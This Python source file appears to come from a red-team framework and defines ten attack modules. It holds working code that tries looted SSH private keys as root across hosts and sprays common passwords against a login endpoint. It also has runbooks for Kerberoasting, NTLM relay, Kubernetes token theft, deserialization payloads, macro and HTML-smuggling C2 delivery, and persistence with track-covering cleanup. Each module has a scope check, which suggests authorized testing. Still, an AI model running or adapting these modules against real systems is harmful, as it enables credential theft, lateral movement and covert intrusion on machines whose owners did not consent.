"""P1 offensive pack — 10 modules (incl. full-exec takeover + spray)."""
from __future__ import annotations

import socket
from typing import Any, Dict, List

from modules.logger import ARDFLogger
from modules.session import Session

from .base import AttackModule, require_in_scope
from .takeover import SubdomainTakeover


class _RunbookModule(AttackModule):
    """Scaffolded module: plan() assembles a live target brief,
    execute() returns the precise runbook until fleshed out."""

    steps: List[str] = []

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        target = (spec.get("target") or session.meta.target)
        require_in_scope(target)
        base = {"module": self.id, "mode": "plan", "target": target,
                "findings_used": len(session.get_findings())}
        hosts = sorted({f.host.split("/")[0] for f in session.get_findings()
                        if f.host})[:25]
        base["host_sample"] = hosts
        return {**base, "steps": self.steps}

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        target = (spec.get("target") or session.meta.target)
        require_in_scope(target)
        return {"module": self.id, "mode": "exec", "target": target,
                "status": "runbook", "steps": self.steps,
                "note": "scaffolded — needs creds/scope-context to fire"}


class ADEnumBuilder(_RunbookModule):
    id = "ad_enum_builder"
    title = "AD enum + Kerberoast/AS-REP builders"
    tier = 3
    summary = ("LDAP/SMB enumeration, kerberoastable + AS-REP roastable "
               "account lists, delegation abuse audit.")
    steps = [
        "LDAP null/auth bind -> collect SPN accounts, group graph, DC list",
        "mark kerberoastable SPNs; emit hashcat modes 13100/18200 requests",
        "AS-REP roastable accounts (preauth not required) -> mode 19900",
        "delegation audit: unconstrained/RBCD/constrained candidates",
        "post hashes to credential_operations.py for cracking pipeline",
    ]


class MFASsoChain(_RunbookModule):
    id = "mfa_sso_chain"
    title = "MFA/SSO abuse chain (OAuth + forced auth + relay)"
    tier = 3
    summary = ("OAuth redirect/state abuse, EWS/NTLM forced-auth detection, "
               "relay-to-LDAP proof via existing proxy chain.")
    steps = [
        "map SSO endpoints from surface (login URLs, oauth dance)",
        "test state/nonce/pkce absence on /authorize",
        "forced-auth relay probe EWS 443/SMTP 587 NTLM (only if egress allows)",
        "relay via proxy_chain listener -> LDAP bind proof (in-scope DC)",
    ]


class ContainerK8s(_RunbookModule):
    id = "container_k8s"
    title = "Container/Kubernetes attack module"
    tier = 3
    summary = ("etcd-no-TLS, kubelet 10250 read-only, service-account token "
               "theft path detection, cluster-role escalation audit.")
    steps = [
        "scan 10250/2379/6443/8080 on in-scope CIDR (safe_ports aware)",
        "kubelet /pods read -> SA token leak candidates",
        "etcd endpoints: attempt read-only /health + range probe",
        "RBAC escalation graph from discovered Role/CRB names (planner)",
    ]


class DeserialFactory(_RunbookModule):
    id = "deserial_factory"
    title = "Deserialization gadget factory"
    tier = 3
    summary = ("Java JNDI/RMI, .NET ViewState machine-key reuse, Python "
               "pickle gadget probes with canary-safe classes.")
    steps = [
        "locate deserial endpoints (coupon: ViewState, JSESSIONID POST, "
        "pickle lengths) from surface crawler output",
        "ysoserial-style payloads gated by canary class only",
        "ViewState: test machine-key reuse combos (blacklist3r table)",
        "evidence: DNS pingback signature, never blind RCE bytes",
    ]


class SSHKeyReuse(_RunbookModule):
    id = "ssh_key_reuse"
    title = "SSH key-reuse scanner (lateral extension)"
    tier = 3
    summary = ("collected private keys/auth banners across "
               "discovered hosts; authorized_keys tamper detection.")
    steps = [
        "collect keys from loot dir (id_rsa)",
        "banner probe 22/tcp on evidence/host inventory",
        "try each key once per host (rate-limited), log successes",
    ]

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        targets = (spec.get("targets") or [
                       h for h in {f.host.split("/")[0]
                                   for f in session.get_findings()} if h])
        [require_in_scope(h) for h in targets]
        import glob as _g
        import os as _o

        keys = []
        for pat in ("output/sessions/*/loot/*.pem", "output/*/loot/*.pem",
                    "loot/id_*"):
            keys += _g.glob(pat)
        successes, tried = [], 0
        try:
            import paramiko

            for t in targets[:20]:
                c = socket.socket()
                c.settimeout(5)
                if c.connect_ex((t, 22)) != 0:
                    c.close()
                    continue
                c.close()
                for k in keys[:10]:
                    tried += 1
                    pkey = _load_pkey(paramiko, k)
                    if not pkey:
                        continue
                    cli = paramiko.SSHClient()
                    cli.set_missing_host_key_policy(
                        paramiko.AutoAddPolicy())
                    try:
                        cli.connect(t, port=22, username="root",
                                    pkey=pkey,
                                    timeout=6, look_for_keys=False,
                                    allow_agent=False)
                        cli.close()
                        successes.append({"host": t, "key": k})
                        session.add_finding(
                            _fnd(t, k, "ssh_key_reuse"))
                        session.save()
                        break
                    except Exception:
                        continue
        except ImportError:
            return {"module": self.id, "mode": "exec",
                    "error": "paramiko not installed"}
        return {"module": self.id, "mode": "exec", "tried": tried,
                "keys_found": keys, "successes": successes}


class WifiAdjacency(_RunbookModule):
    id = "wifi_adjacency"
    title = "Wi-Fi / adjacency audit kit"
    tier = 3
    summary = (" rogue-AP detection, captive-portal bypass probes, PMKID "
               "capture workflow for authorized physical engagements.")
    steps = [
        "prerequisite: authorization scoped; requires physical kit + explicit auth",
        "airmon-ng scan and fingerprint neighbour APs/EAP modes",
        "captive portal template probes for exposed networks",
        "PMKID hop: hcx tools capture -> hashcat mode 22000",
    ]


class MacroC2Chain(_RunbookModule):
    id = "c2_macro_chain"
    title = "Client-side delivery chain (macro/HTML C2)"
    tier = 3
    summary = ("Word/Excel macro and HTML smuggling builder wired to "
               "ardf_v2_c2_infrastructure callback handlers.")
    steps = [
        "choose template (macro/wma/iso-lnk/html smuggle)",
        "generate stager via payload_db + c2 reg endpoint",
        "produce canary test doc anchored to track_cover tokens",
        "delivery email draft (SE module integration)",
    ]


class PasswordSpray(AttackModule):
    id = "password_spray"
    title = "Lockout-aware password-spray governor"
    tier = 3
    summary = ("sprays from thin-accounts; smartens against lockout "
               "policy; integrates modules/validate/auth.test_credentials.")
    confirm_word = "CONFIRM"

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        target = spec.get("login_url") or session.meta.target
        require_in_scope(target)
        users = (session.get_findings() and None) or self._users(session)
        return {"module": self.id, "mode": "plan", "login_url": target,
                "users": users[:50],
                "attempt_limit_per_user": int(spec.get("per_user_cap", 2))}

    def _users(self, session: Session) -> List[str]:
        out = set()
        for f in session.get_findings():
            raw = f.raw if isinstance(f.raw, dict) else {}
            for u in raw.get("usernames", []) or []:
                if isinstance(u, str) and "@" not in u:
                    out.add(u)
        return sorted(out)

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        from modules.validate.auth import AuthValidator
        from modules.logger import get_logger as _gl

        login_url = spec.get("login_url") or session.meta.target
        require_in_scope(login_url)
        users = self._users(session) or ["admin"]
        passwords = [p for p in
                     (spec.get("passwords") or
                      ["Spring2026!", "Welcome123", "P@ssw0rd"])][:3]
        cap = max(int(spec.get("per_user_cap", 2)), 1)
        hits, tried = [], 0
        av = AuthValidator(session, _gl("attacks.spray"))
        for pw in passwords:
            for u in users:
                if tried >= cap * len(users):
                    break
                tried += 1
                ok, note = av.test_credentials(login_url, u, pw)
                if ok:
                    hits.append({"user": u, "password": pw, "note": note})
                    session.add_finding(
                        _fnd(login_url, f"{u}:{pw}", "password_spray"))
                    session.save()
                    logger.success(f"spray hit {u}")
        return {"module": self.id, "mode": "exec", "attempted": tried,
                "hits": hits}


class PersistenceCheck(_RunbookModule):
    id = "persistence_check"
    title = "Persistence verification suite (survive-reboot audit)"
    tier = 3
    summary = ("schtasks/service/dotfile creation dry-runs; flags reboot "
               "survival state; dry-run by default, real-timed sandbox "
               "mode only after confirm.")
    steps = [
        "enumerate existing persistence (win: schtasks/Run keys, "
        "linux: cron/systemd-user/.bashrc)",
        "dry-run: deposit benign canary persistence job",
        "confirm reboot survival test ONLY in sandbox VM context",
        "cleanup script via track_cover",
    ]


def _load_pkey(paramiko, path: str):
    for kind in ("RSAKey", "Ed25519Key", "ECDSAKey"):
        try:
            return getattr(paramiko, kind).from_private_key_file(path)
        except Exception:
            continue
    return None


def _fnd(host: str, evidence: str, tag: str):
    from modules.session import Finding, SeverityLevel

    return Finding(source="attacks", title=f"{tag}: {host}", host=host,
                   severity=SeverityLevel.HIGH, evidence=evidence,
                   tags=[tag, "executed"])


# registry contributions for this pack
PACK1 = [
    SubdomainTakeover(),
    ADEnumBuilder(),
    MFASsoChain(),
    ContainerK8s(),
    DeserialFactory(),
    SSHKeyReuse(),
    WifiAdjacency(),
    MacroC2Chain(),
    PasswordSpray(),
    PersistenceCheck(),
]
